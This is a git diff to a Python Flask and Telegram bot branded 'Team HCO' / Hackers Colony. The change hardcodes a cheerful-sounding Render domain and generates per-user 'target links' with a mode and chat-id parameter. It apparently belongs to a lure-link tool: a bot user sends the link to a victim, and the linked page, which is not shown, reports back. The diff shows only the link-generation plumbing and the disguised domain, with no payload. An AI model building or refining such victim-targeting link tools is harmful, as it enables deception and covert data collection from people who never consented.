@@ -4,8 +4,9 @@ from telebot import types
 
 app = Flask(__name__)
 
-# Configuration from Environment Variables
+# Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
+APP_URL = "https://happy-wishing-you.onrender.com" 
 ADMINS = [518067190, 7162565886]
 TG_CHANNEL = "https://t.me/HackersColony"
 YT_LINK = "https://youtube.com/@hackers_colony_tech?si=W2r1_Su7wPvnfy2u"
@@ -21,7 +22,6 @@ def db_init():
 
 db_init()
 
-# Clear previous sessions to avoid 409 error
 bot.remove_webhook()
 time.sleep(2)
 
@@ -69,20 +69,15 @@ def callback_query(call):
 
     elif "m_" in call.data:
         mode = call.data.replace("m_", "")
-        # This part generates the blue clickable link
-        try:
-            # Fixing the URL logic specifically for Render
-            app_domain = request.host.rstrip('/')
-            target_link = f"https://{app_domain}/?m={mode}&uid={call.message.chat.id}"
-            
-            response_text = (
-                f"🤠 It's your target link 🔗\n\n"
-                f"Url = ( {target_link} )\n\n"
-                f"✨ Thank you team HCO ✨"
-            )
-            bot.send_message(call.message.chat.id, response_text, parse_mode='HTML', disable_web_page_preview=True)
-        except Exception as e:
-            bot.send_message(call.message.chat.id, f"Error: {str(e)}")
+        # Link generation fixed to avoid Context Error
+        target_link = f"{APP_URL}/?m={mode}&uid={call.message.chat.id}"
+        
+        response_text = (
+            f"🤠 It's your target link 🔗\n\n"
+            f"Url = ( {target_link} )\n\n"
+            f"✨ Thank you team HCO ✨"
+        )
+        bot.send_message(call.message.chat.id, response_text, parse_mode='HTML', disable_web_page_preview=True)
 
 @app.route('/')
 def index():
